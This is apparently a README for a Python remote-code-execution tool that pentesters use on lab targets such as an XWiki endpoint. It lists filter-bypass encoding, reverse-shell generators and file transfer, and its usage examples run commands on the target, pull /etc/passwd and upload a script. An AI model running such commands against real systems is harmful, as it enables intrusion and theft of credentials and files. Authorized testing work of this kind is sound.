# RCE-Foryou
Python tool for safely testing and exploiting RCE vulnerabilities in authorized penetration testing environments. Supports XWiki Groovy, Bash, Groovy exec, interactive shell, file upload/download, and output extraction via regex. ⚠️ Legal notice: Only use this tool in authorized environments. Unauthorized use is illegal and unethical.

Advanced Universal RCE Runner

Python tool for security researchers and pentesters to safely test Remote Code Execution (RCE) vulnerabilities in authorized environments.

This tool allows you to:

Execute arbitrary commands on HTTP targets with vulnerable input fields.

Choose between multiple payload presets (XWiki Groovy, Bash -c, Groovy exec, etc.).

Encode payloads in URL or Base64 for bypassing filters.

Extract output from responses using custom regex and optional HTML unescaping.

Use an interactive shell mode with helpers (whoami, pwd, ls, reverse-shell generators).

Upload and download files via Base64 stagers, even without write permissions beyond the RCE.

Customize headers, cookies, query parameters, and request bodies.

Work through proxies, handle retries with backoff, and toggle TLS verification.

Usage Examples

Run a single command (e.g., whoami) on XWiki vulnerable endpoint:

python3 rce_driver.py \
  --base-url http://wiki.editor.htb \
  --method GET \
  --path /xwiki/bin/get/Main/SolrSearch \
  --param media=rss \
  --inject-param text \
  --preset xwiki-groovy \
  --extract-regex "\[\}\}\}(.*?)\]" \
  --cmd "whoami"


Interactive shell mode:

python3 rce_driver.py [..same parameters..] --shell


Download a file from the target:

python3 rce_driver.py [..] --download /etc/passwd --out passwd.txt


Upload a file to the target:

python3 rce_driver.py [..] --upload ./localfile.sh:/tmp/remote.sh
